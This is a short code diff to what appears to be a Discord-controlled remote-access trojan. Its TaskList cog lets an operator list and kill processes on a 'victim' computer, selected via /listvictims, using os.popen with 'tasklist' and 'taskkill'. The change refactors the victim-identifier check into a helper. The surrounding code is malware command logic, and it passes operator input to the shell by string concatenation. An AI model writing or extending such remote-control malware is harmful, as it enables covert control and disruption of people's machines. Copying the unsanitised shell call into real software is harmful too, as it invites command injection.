@@ -19,7 +19,7 @@ class TaskList(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         """
         
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             
             list = os.popen('tasklist').read() # I swear I'll make it better later
@@ -45,7 +45,7 @@ class TaskList(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         """
         
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             
             list = os.popen('tasklist /APPS').read() # I SWEAR...
@@ -72,7 +72,7 @@ class TaskList(commands.Cog):
         task: Task to kill ( give real name + extension {ex: mspaint.exe} )
         """
         
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             
             list = os.popen('taskkill /f /t /im ' + task).read() # I SWEAR...
